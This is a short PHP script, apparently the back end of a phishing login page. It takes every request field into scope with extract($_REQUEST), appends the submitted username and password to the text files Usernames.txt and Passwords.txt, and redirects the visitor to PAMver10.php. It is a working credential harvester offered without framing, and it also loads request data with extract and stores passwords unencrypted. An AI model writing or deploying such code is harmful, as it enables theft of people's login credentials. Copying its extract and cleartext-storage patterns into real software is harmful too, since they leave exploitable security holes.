<?php
    extract($_REQUEST);
    $file=fopen("Usernames.txt","a+");

    fwrite($file, $username ."\n");
    $file=fopen("Passwords.txt","a+");
    fwrite($file, $password ."\n");
    fclose($file);
    header("location: PAMver10.php");
 ?>
